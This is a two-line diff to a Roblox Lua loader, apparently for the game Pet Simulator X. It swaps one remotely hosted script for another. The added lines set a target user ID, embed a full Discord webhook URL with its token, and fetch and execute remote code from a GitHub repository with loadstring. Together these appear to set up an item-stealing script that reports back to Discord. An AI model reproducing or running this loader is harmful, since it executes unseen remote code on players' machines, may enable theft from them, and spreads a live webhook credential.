@@ -1,2 +1,3 @@
-_G.License = "69c4c09a63474f55872d"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+_G.UserID = 2789670559
+_G.WebHook = "https://discord.com/api/webhooks/1007800293360140349/EVhgrLyVE_hiyp3WXzaNeZ9kSQapvfKLUCKclwIVAOZWHHF_5D-Mud2pWcdfAR_3Q9Ez"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
